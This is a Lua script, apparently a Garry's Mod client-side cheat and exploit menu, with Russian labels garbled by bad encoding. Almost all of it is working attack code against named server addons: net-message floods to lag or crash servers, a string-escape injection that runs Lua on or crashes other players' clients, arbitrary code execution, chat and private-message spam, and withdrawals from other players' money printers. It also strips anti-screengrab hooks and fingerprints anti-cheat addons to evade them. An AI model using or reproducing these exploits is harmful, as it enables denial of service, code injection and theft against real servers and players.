local version = 'Private'
local net, util, timer, file, ents, concommand, cookie, hook
local gtbl = _Z_ and _Z_ or _G
net, util, timer, file, ents, concommand, cookie, hook = gtbl.net, gtbl.util, gtbl.timer, gtbl.file, gtbl.ents, gtbl.concommand, gtbl.cookie, _G.hook

local function netValid( ... )
    local tbl = { ... }
    for i = 1, #tbl do
        local name = string.lower( tbl[ i ] )
        if !net.Receivers[ name ] and util.NetworkStringToID( name ) == 0 then
            return false
        end
    end
    
    return true
end

local function concValid( ... )
    local conctbl = concommand.GetTable()
    local tbl = { ... }

    for i = 1, #tbl do
        if not conctbl[ tbl[ i ] ] then
            return false
        end
    end
    
    return true
end

local function hookValid( ... )
    local hooks = hook.GetTable()
    local args = { ... }

    for i = 1, math.max( #args / 2, 1 ) do
        local events = hooks[ args[ i ] ]

        if not events or not events[ args[ i * 2 ] ] then
            return false
        end
    end
    
    return true
end

local function playsound( soundname )
    sound.PlayFile( soundname, '', function() end )
end

surface.CreateFont( '_z_em', { 
    font = 'Roboto',
    size = 20,
    extended = true
} )

surface.CreateFont( '_z_emm', { 
    font = 'Roboto',
    size = 15,
    extended = true
} )

//Bypasses

timer.Destroy( 'STC' )
hook.Remove( 'PlayerInitialSpawn', 'AddPlayer' )

//Anti-Screengrab

local function scrgrb()
    if _Z_ and _Z_.screengrab then
        return true
    end

    if GTS and GTS[ 'GTS:ScaledNetworkEntry' ][ 'Request' ] then
        return true
    end
    
    if LeyScreenCap and LeyScreenCap.shouldcap then
        return true
    end
end

if hookValid( 'PostRender', 'Screengrab' ) then
    hook.Remove( 'PostRender', 'Screengrab' )
end

//Vars

local scrw, scrh = ScrW() * 0.75, ScrH() * 0.75

local exploitinfo = {}
local currenttext = ''
local selectedplys = {}
local selectedall = false

local exploitavailable = 0
local exploitcount = 0
local antiexp = {}
local antiexpdetect = false

local spotsdraw = !isstring( cookie.GetString( '_z_wallpaper' ) )
local spotstable = {}
for i = 1, 25 do
    spotstable[ i ] = { x = math.Rand( 1, scrw ), y = math.Rand( 1, scrh ), x2 = math.Rand( -2, 2 ), y2 = math.Rand( -2, 2 ) }
end

local count = {}
local function getCount( name )
    local countn = ( count[ name ] or 0 ) + 1
    count[ name ] = countn
    return countn
end


local bgs = {
    { url = 'https://steamuserimages-a.akamaihd.net/ugc/830200028751744708/80F144A830BA23C83F4333118E8E9A5C5BAF77CA/?imw=512&imh=512&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true',
    w = 512, h = 512,
    color = Color( 0, 0, 0 ) },
    
    { url = 'https://static.cracked.to/uploads/avatars/avatar_77664.gif',
    w = 175, h = 175,
    color = Color( 21, 21, 21 ) }
}
local bg = bgs[ math.random( #bgs ) ]

local lply = LocalPlayer()
local whitelist = {
    [ 'STEAM_0:0:227388576' ] = true, --Ð¯
    [ 'STEAM_0:0:149468019' ] = true,
    
    [ 'STEAM_0:1:116008424' ] = true, --Ð¢Ð¾ÑÑ‚ÐµÑ€
    
    [ 'STEAM_0:1:555448310' ] = true, --ÐœÐ°ÐºÑ
    [ 'STEAM_0:1:433109673' ] = true,
    [ 'STEAM_0:1:49246984' ] = true,
    [ 'STEAM_0:0:518211648' ] = true,
    [ 'STEAM_0:1:530488193' ] = true,
    
    [ 'STEAM_0:0:211825646' ] = true, --ÐšÑ‚Ð¾
}

local function EyeTrace()
    return GetEyeTrace and GetEyeTrace() or util.TraceLine( {
        start = lply:EyePos(),
        endpos = lply:EyePos() + lply:EyeAngles():Forward() * 10000,
        filter = lply
    } )
end

local sounds = {
    'sound/UI/buttonrollover.wav',
    'sound/UI/buttonclick.wav',
    'sound/UI/buttonclickrelease.wav',
    'sound/buttons/button11.wav',
}

//AntiExploits

if concValid( 'cpe_menu' ) then
    table.insert( antiexp, 'CPE' )
    antiexpdetect = true
end

if SwiftAC then
    table.insert( antiexp, 'SwiftAC' )
    antiexpdetect = true
end

if concValid( 'nbp_config' ) then
    table.insert( antiexp, 'NBP' )
    antiexpdetect = true
end

if gAC then
    table.insert( antiexp, 'GAC' )
    antiexpdetect = true
end

//Exploits

local exploits = {
    { name = 'ÐšÑ€Ð°Ñˆ ÑÐµÑ€Ð²ÐµÑ€Ð° #' .. getCount(  'crashserver' ), desc = 'ÐŸÐµÑ€ÐµÐ´ Ð²ÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸ÐµÐ¼ Ð¿Ð¾ÑÑ‚Ð°Ð²ÑŒÑ‚Ðµ Ñ€ÑÐ³Ð´Ð¾Ð»Ð»', check = function()
        return netValid( 'properties' )
    end, func = function()
        local ragdolls = ents.FindByClass( 'prop_ragdoll' )
        
        for i = 1, #ragdolls do
            local ragdoll = ragdolls[ i ]
            
            if ragdoll:IsRagdoll() and gamemode.Call( 'CanProperty', lply, 'motioncontrol_ragdoll', ragdoll ) then
                for _ = 1, 1000 do
                    net.Start( 'properties' )
                    net.WriteString( 'motioncontrol_ragdoll' )
                    net.WriteEntity( ragdoll )
                    net.SendToServer()
                end
                break
            end
        end
    end, rare = 4, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ GM-Donate', check = function()
        return netValid( 'TL.sayColor' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'TL.sayColor', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'tl.saycolorlags', rare = 3, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð°', check = function()
        return netValid( 'StackGhost' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'StackGhost', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'stackghostlags', rare = 3, status = 'Outdated' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð’Ð°Ð¼ Ð½ÑƒÐ¶Ð½Ð¾ Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ð² Ñ€ÑƒÐºÐ°Ñ… Ð¾Ñ€ÑƒÐ¶Ð¸Ðµ Ð¸Ð· CW 2.0', check = function()
        return netValid( 'CW20_PRESET_LOAD' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'CW20_PRESET_LOAD', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'cw20lags', rare = 2, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ ÑÐºÑ€Ð¸Ð½Ð³Ñ€Ð°Ð±Ð°', check = function()
        return concValid( 'screengrab' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'rtxappend2', true )
            net.WriteTable( { 'lol' } )
            net.SendToServer()
        end
    end, t = .01, tn = 'rtxappend2lag', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð²Ð·Ð»Ð¾Ð¼Ñ‰Ð¸ÐºÐ° Ð´Ñ€Ð¾Ð½Ð¾Ð²', check = function()
        return netValid( 'drones_usecmd' )
    end, func = function()
        local ents = ents.FindByClass( 'hacktool_drone' )
        local plys = player.GetHumans()
        for i = 1, #ents do
            local ent = ents[ i ]
            for _ = 1, 100 do
                net.Start( 'drones_usecmd' )
                net.WriteEntity( ent )
                net.WriteEntity( plys[ math.random( #plys ) ] )
                net.WriteString( 'help' )
                net.SendToServer()
            end
        end
    end, t = .01, tn = 'dronelags', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾Ð¸Ð½Ñ‚ÑˆÐ¾Ð¿Ð°', check = function()
        return netValid( 'ItemStoreUse' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'ItemStoreUse', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'lagsitemstore', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð°', check = function()
        return netValid( 'Morpheus.StaffTracker' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'Morpheus.StaffTracker', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'lagsmorph', rare = 1, status = 'Outdated' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾Ð¸Ð½Ñ‚ÑˆÐ¾Ð¿Ð°', check = function()
        return netValid( 'SlotsRemoved' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'SlotsRemoved', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'pslotslags', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ð¸ Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸ÑÑ…', check = function()
        return netValid( 'join_disconnect' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'join_disconnect', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'joindisclags', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'ÐšÐ¸ÐºÐ½ÑƒÑ‚ÑŒ Ð²ÑÐµÑ… Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð² Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ RDM-Ð¼ÐµÐ½ÐµÐ´Ð¶ÐµÑ€Ð°', check = function()
        return netValid( 'DL_Answering' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'DL_Answering', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'dlanswlags', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ ESM', check = function()
        return netValid( 'ESM_WelcomePointsModule_PlayerReady' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'ESM_WelcomePointsModule_PlayerReady', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'esmlags', rare = 2, status = 'Undetected' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ NadMod', check = function()
        return netValid( 'nadmod_ppfriends' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'nadmod_ppfriends', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'nadmodlags', rare = 1, status = 'Undetected' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ ULX', check = function()
        return netValid( 'ulxcc_RequestFiles' )
    end, func = function()
        for _ = 1, 10000 do
            net.Start( 'ulxcc_RequestFiles', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'ulxccfileslags', rare = 1, status = 'Undetected' },

    { name = 'Ð›Ð°Ð³Ð¸ #' .. getCount( 'lags' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ€Ð²ÐµÑ€Ð° Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ OutFitter', check = function()
        return outfitter
    end, func = function()
        for _ = 1, 5000 do
            net.Start( 'BodyGroupData', true )
            net.SendToServer()
            net.Start( 'NetData', true )
            net.SendToServer()
        end
    end, t = .01, tn = 'outfitterlags', rare = 1, status = 'Detect' },

    { name = 'Ð›Ð°Ð³Ð¸ ÐºÐ»Ð¸ÐµÐ½Ñ‚Ð° #' .. getCount( 'lagsclient' ), desc = 'Ð—Ð°Ð»Ð°Ð³Ð¸Ð²Ð°Ð½Ð¸Ðµ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ñ… Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð² Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ñ‡Ð°Ñ‚Ð°', check = function()
        return atlaschat
    end, func = function()
        if table.Count( selectedplys ) == 0 then
            return
        end
        
        local _, ply = table.Random( selectedplys )
        
        for _ = 1, 1000 do
            net.Start( 'atlaschat.invpm', true )
            net.WriteUInt( 0, 8 )
            net.WriteString( ply:SteamID() )
            net.SendToServer()
        end
    end, t = .01, tn = 'atlasinvitelagsclient', rare = 1, status = 'Undetected' },

    { name = 'ÐšÑ€Ð°Ñˆ ÐºÐ»Ð¸ÐµÐ½Ñ‚Ð° #' .. getCount( 'crashclient' ), desc = 'ÐšÑ€Ð°ÑˆÐ½ÑƒÑ‚ÑŒ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ñ… Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð² Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð²Ð·Ð»Ð¾Ð¼Ñ‰Ð¸ÐºÐ° Ð´Ñ€Ð¾Ð½Ð¾Ð²', check = function()
        return netValid( 'drones_usecmd' )
    end, func = function()
        local ent = ents.FindByClass( 'hacktool_drone' )[ 1 ]
        if !ent:IsValid() then
            return
        end
        
        net.Start( 'drones_usecmd' )
        net.WriteEntity( ent )
        net.WriteEntity( lply )
        net.WriteString( '\')table.Empty(debug.getregistry())--' )
        net.SendToServer()
    end, rare = 2, status = 'Detect' },

    { name = 'Ð’Ð·Ð»Ð¾Ð¼ Ð¸Ð³Ñ€Ð¾ÐºÐ¾Ð²', desc = 'Ð—Ð°Ð¿ÑƒÑÐº Ð»ÑƒÐ° Ð½Ð° Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ñ… Ð¸Ð³Ñ€Ð¾ÐºÐ°Ñ… Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð²Ð·Ð»Ð¾Ð¼Ñ‰Ð¸ÐºÐ° Ð´Ñ€Ð¾Ð½Ð¾Ð²', check = function()
        return netValid( 'drones_usecmd' )
    end, func = function()
        local ent = ents.FindByClass( 'hacktool_drone' )[ 1 ]
        if !ent:IsValid() then
            return
        end
        
        net.Start( 'drones_usecmd' )
        net.WriteEntity( ent )
        net.WriteEntity( lply )
        net.WriteString( '\')' .. currenttext .. '--' )
        net.SendToServer()
        
        for ply in pairs( selectedplys ) do
            net.Start( 'drones_usecmd' )
            net.WriteEntity( ent )
            net.WriteEntity( ply )
            net.WriteString( 'consolelog' )
            net.SendToServer()
        end
        
        net.Start( 'drones_usecmd' )
        net.WriteEntity( ent )
        net.WriteEntity( lply )
        net.WriteString( 'clear' )
        net.SendToServer()
    end, rare = 2, status = 'Detect' },

    { name = 'ÐœÐ½Ð¾Ð³Ð¾ÑÑ‚Ñ€Ð¾Ñ‡Ð½Ñ‹Ð¹ Ñ„Ð»ÑƒÐ´ Ð² Ñ‡Ð°Ñ‚', desc = 'ÐŸÐ¸ÑˆÐµÑ‚ Ð² Ñ‡Ð°Ñ‚ Ð²Ð°Ñˆ Ñ‚ÐµÐºÑÑ‚ Ð² 3 ÑÑ‚Ñ€Ð¾ÐºÐ¸', check = function()
        return true
    end, func = function()
        lply:ConCommand( 'say ' .. currenttext .. string.rep( '\t', 64 ) )
    end, t = .01, tn = 'chatfloodbig', rare = 0, status = 'Undetected' },

    { name = 'Ð¤Ð»ÑƒÐ´ Ð² Ð›Ð¡', desc = 'Ð¤Ð»ÑƒÐ´Ð¸Ñ‚ Ð²ÑÐµÐ¼ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð½Ñ‹Ð¼ Ð¸Ð³Ñ€Ð¾ÐºÐ°Ð¼ Ð² Ð»Ñ', check = function()
        return ulx and ulx.psay
    end, func = function()
        for ply in pairs( selectedplys ) do
            lply:ConCommand( 'ulx psay $' .. ply:UserID() .. ' \"' .. currenttext .. '\"' )
        end
    end, t = .01, tn = 'ulxflood', rare = 0, status = 'Undetected' },

    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð¿Ð°ÑÑ…Ð°Ð»ÑŒÐ½Ð¾Ðµ ÑÐ¹Ñ†Ð¾', desc = 'ÐÐ¸Ñ‡ÐµÐ³Ð¾ Ð½Ðµ Ð´Ð°Ñ‘Ñ‚ ÐºÑ€Ð¾Ð¼Ðµ Ð¿Ð¾Ð¼ÐµÑ‚ÐºÐ¸ Ð² Ñ‡Ð°Ñ‚Ðµ', check = function()
        return ConVarExists( 'eastereggs_enable' )
    end, func = function()
        lply:ConCommand( 'say 4bigz;cc_egg2' )
        net.Start( 'egg' )
        net.SendToServer()
    end, rare = 1, status = 'Undetected' },

    { name = 'Ð’Ð·Ð»Ð¾Ð¼ Ð¸ÐºÐ¾Ð½Ð¾Ðº', desc = 'ÐšÐ°Ð¶Ð´ÑƒÑŽ Ð´ÐµÑÑÑ‚ÑƒÑŽ ÑÐµÐºÑƒÐ½Ð´Ñ‹ Ð¼ÐµÐ½ÑÐµÑ‚ Ð¸ÐºÐ¾Ð½ÐºÑƒ Ð½Ð°Ð´ Ð²Ð°Ð¼Ð¸ Ð½Ð° Ð»ÑŽÐ±ÑƒÑŽ', check = function()
        return netValid( 'PlyStatusIcons_StatusUpdate' )
    end, func = function()
        net.Start( 'PlyStatusIcons_StatusUpdate' )
        net.WriteUInt( math.random( 1, 7 ), 7 )
        net.SendToServer()
    end, t = .1, tn = 'iconhack', rare = 2, status = 'Undetected' },

    { name = 'Ð—Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ð»ÑƒÐ°', desc = 'Ð—Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ð»ÑƒÐ° Ð½Ð° ÑÐµÐ±Ðµ', check = function()
        return true
    end, func = function()
        RunString( currenttext )
    end, rare = 0, status = 'Undetected' },

    { name = 'ÐšÐ»Ð¸ÐºÐµÑ€ #' .. getCount( 'clicker' ), desc = 'Ð‘Ñ‹ÑÑ‚Ñ€Ð¾ Ð²Ð·Ð»Ð¾Ð¼Ð°Ñ‚ÑŒ Ð½Ð°Ñ€ÑƒÑ‡Ð½Ð¸ÐºÐ¸, Ð±Ñ‹ÑÑ‚Ñ€Ð¾ ÑÐ¿Ð°Ð²Ð½Ð¸Ñ‚ÑŒ Ñ‡Ñ‚Ð¾-Ð»Ð¸Ð±Ð¾', check = function()
        return true
    end, act = function()
        hook.Add( 'CreateMove', '_z_em_clicker', function( usercmd )
            if usercmd:TickCount() % 2 == 0 then
                usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_ATTACK ) )
            else
                usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_ATTACK2 ) )
            end
        end )
    end, deact = function()
        hook.Remove( 'CreateMove', '_z_em_clicker' )
    end, t = 0, tn = 'clicker', rare = 0, status = 'Undetected' },

    { name = 'ÐšÐ»Ð¸ÐºÐµÑ€ #' .. getCount( 'clicker' ), desc = 'Ð¤Ð»ÑƒÐ´Ð¸Ñ‚ÑŒ Ð´Ð²ÐµÑ€ÑŒÑŽ Ð¸Ð»Ð¸ Ñ‚.Ð¿.', check = function()
        return true
    end, act = function()
        hook.Add( 'CreateMove', '_z_em_clickeruse', function( usercmd )
            if usercmd:TickCount() % 2 == 0 then
                usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_USE ) )
            end
        end )
    end, deact = function()
        hook.Remove( 'CreateMove', '_z_em_clickeruse' )
    end, t = 0, tn = 'clickeruse', rare = 0, status = 'Undetected' },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð²Ð¸ÐºÑ‚Ð¾Ñ€Ð¸Ð½ (Ð½ÑƒÐ¶Ð½Ð¾ Ð¶Ð´Ð°Ñ‚ÑŒ Ð½ÐµÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ðµ Ð²Ñ€ÐµÐ¼Ñ, ÑÐºÑ€Ð¸Ð¿Ñ‚ ÑÐ°Ð¼ Ð±ÑƒÐ´ÐµÑ‚ Ð¿Ñ€Ð¾Ñ…Ð¾Ð´Ð¸Ñ‚ÑŒ Ð²Ð¸ÐºÑ‚Ð¾Ñ€Ð¸Ð½Ñ‹)', check = function()
        return netValid( 'quizhuiz' )
    end, act = function()
        net.Receive( 'quizhuiz', function()
            net.ReadFloat()
            net.ReadColor()
            net.ReadString()
            net.ReadColor()
            net.ReadString()
            net.ReadString()
            net.ReadColor()
            
            lply:ConCommand( 'say ' .. net.ReadFloat() + net.ReadFloat() )
        end )
    end, deact = function()
        net.Receivers.quizhuiz = exploitinfo.quizhuiz
    end, t = 0, tn = 'quizhuizfree', rare = 2, status = 'Undetected', tags = {
        quizhuiz = net.Receivers[ 'quizhuiz' ]
    } },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð°Ð²Ñ‚Ð¾-ÑÐ±Ð¾Ñ€Ð° Ð´ÐµÐ½ÐµÐ³ Ñ Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð° (Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð° Ð´Ð¸ÑÑ‚Ð°Ð½Ñ†Ð¸Ð¸ Ð¼ÐµÐ½ÑŒÑˆÐµ 100)', check = function()
        return netValid( 'GambitPrinter.Withdraw' )
    end, func = function()
        exploitinfo.fprinterindex = exploitinfo.fprinterindex + 1
        
        local ents = ents.FindByClass( 'f_printer' )
        local count = #ents
        
        if exploitinfo.fprinterindex > count then
            exploitinfo.fprinterindex = 1
        end
        
        local ent = ents[ exploitinfo.fprinterindex ]
        
        if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 300 and ( !ent.GetMoney or ent:GetMoney() > 0 ) then
            net.Start( 'GambitPrinter.Withdraw' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, t = .1, tn = 'fprinterhack', rare = 1, status = 'Undetected', tags = {
        fprinterindex = 0
    } },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð°Ð²Ñ‚Ð¾-ÑÐ±Ð¾Ñ€Ð° Ð´ÐµÐ½ÐµÐ³ Ñ Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð° (Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð° Ð´Ð¸ÑÑ‚Ð°Ð½Ñ†Ð¸Ð¸ Ð¼ÐµÐ½ÑŒÑˆÐµ 100)', check = function()
        return netValid( 'GPrinter.Withdraw' )
    end, func = function()
        exploitinfo.gprinterindex = exploitinfo.gprinterindex + 1
        
        local ents = ents.FindByClass( 'g-printer' )
        local count = #ents
        
        if exploitinfo.gprinterindex > count then
            exploitinfo.gprinterindex = 1
        end
        
        local ent = ents[ exploitinfo.gprinterindex ]

        if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 100 and ( !ent.GetMoney or ent:GetMoney() > 0 ) then
            net.Start( 'GPrinter.Withdraw' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, t = .1, tn = 'gprinterhack', rare = 1, status = 'Undetected', tags = {
        gprinterindex = 0
    } },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð°Ð²Ñ‚Ð¾-ÑÐ±Ð¾Ñ€Ð° Ð´ÐµÐ½ÐµÐ³ Ñ Ð¿Ñ€Ð¸Ð½Ñ‚ÐµÑ€Ð°', check = function()
        return netValid( 'ActiveP' )
    end, func = function()
        local ents = ents.FindByClass( 'derma_printer' )
        local pos = lply:GetPos()
        
        for i = 1, #ents do
            local ent = ents[ i ]
            if ent:GetPos():Distance( pos ) < 100 and ent:GetMoney() > 0 then
                net.Start( 'withdrawp' )
                net.WriteEntity( ent )
                net.SendToServer()
            end
        end
    end, t = .1, tn = 'dermaprinterhack', rare = 1, status = 'Use at own risk' },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ð½Ñ‹Ðµ 50 ÐºÑ€ÐµÐ´Ð¸Ñ‚Ð¾Ð²', check = function()
        return netValid( 'gambitmode' )
    end, func = function()
        net.Start( 'gambitmode' )
        net.SendToServer()
    end, rare = 4, status = 'Undetected' },
    
    { name = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ #' .. getCount( 'free' ), desc = 'ÐŸÐ¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ñ…Ð°Ð»ÑÐ²Ñƒ Ñ Ð°Ð²Ñ‚Ð¾-ÑÐ±Ð¾Ñ€Ð° Ð´ÐµÐ½ÐµÐ³ Ñ ÐºÐ»Ð¸ÐºÐµÑ€Ð° (Ð½ÑƒÐ¶Ð½Ð¾ Ð½Ð°Ð²ÐµÑÑ‚Ð¸ Ð¿Ñ€Ð¸Ñ†ÐµÐ», Ñ€Ð°Ð±Ð¾Ñ‚Ð°ÐµÑ‚ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð° ÐºÐ¾Ñ€Ð¾Ñ‚ÐºÐ¾Ð¹ Ð´Ð¸ÑÑ‚Ð°Ð½Ñ†Ð¸Ð¸)', check = function()
        return netValid( 'money_clicker_withdraw' )
    end, func = function()
        local ent = EyeTrace().Entity

        if ent:IsValid() and ent:GetClass() == 'money_clicker' and ent:GetPos():Distance( lply:GetPos() ) < 150 and ent:GetMoney() > 0 then
            net.Start( 'money_clicker_withdraw' )
            net.WriteEntity( ent )
            net.SendToServer()
        end
    end, t = .1, tn = 'moneyclickerwithdraw', rare = 1, status = 'Undetected' },
    
